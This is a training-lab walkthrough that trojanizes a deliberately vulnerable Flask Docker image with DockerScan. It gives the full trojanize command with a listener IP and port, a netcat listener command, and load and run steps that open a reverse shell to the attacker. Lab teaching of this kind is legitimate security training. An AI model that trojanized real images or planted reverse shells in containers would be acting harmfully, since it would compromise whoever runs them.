# **Trojanized Docker Images - DockerScan**

---

> #### A docker image can be trojanized with a tool called `DockerScan`. When a trojanized container is launched, the attacker can get a `reverse-shell` on-to the container

### **Lab Image : Containers**

---

* Step 1: Navigate to the `Trojanized Docker Images` directory

```commandline
cd /root/container-training/Container/Trojanized-Docker-Image/
```

* Step 2: Pull and save the docker image that is to be trojanized

```commandline
docker pull abhaybhargav/vul_flask && docker save abhaybhargav/vul_flask:latest -o abhaybhargav-vul_flask
```

---

#### Step 2:


* Fetch the IP of the provisioned server

```commandline
serverip
```

* Trojanize the saved docker to create a `.tar` file

> **EXAMPLE**: `dockerscan image modify trojanize abhaybhargav-vul_flask -l 104.1.1.1 -p 1337 -o abhaybhargav-vul_flask-trojanized`

```commandline
dockerscan image modify trojanize abhaybhargav-vul_flask -l $(serverip) -p 1337 -o abhaybhargav-vul_flask-trojanized
```

---

#### Step 3:

* Once the command on **Step 2** has been run, a `netcat` command is returned. Run the command in another tab or use `tmux` to split the terminal.

> **EXAMPLE**: `nc -v -k -l 104.1.1.1 1337`

```commandline
nc -v -k -l $(serverip) 1337
```

* Load the trojanized `.tar` docker file

```commandline
docker load -i abhaybhargav-vul_flask-trojanized.tar
```

---

#### Step 4:

* Confirm that the trojanized image has been loaded

```commandline
docker images
```

* When the trojanized docker is run, the listener should have reverse-shell access to the container

```commandline
docker run -d -p 5000:5000 abhaybhargav/vul_flask
```

---

#### *Teardown*:

* Stop/Close the `reverse-shell` tab

* Stop all containers

```commandline
clean-docker
```

---

### Reading Material/References:

* https://github.com/cr0hn/dockerscan
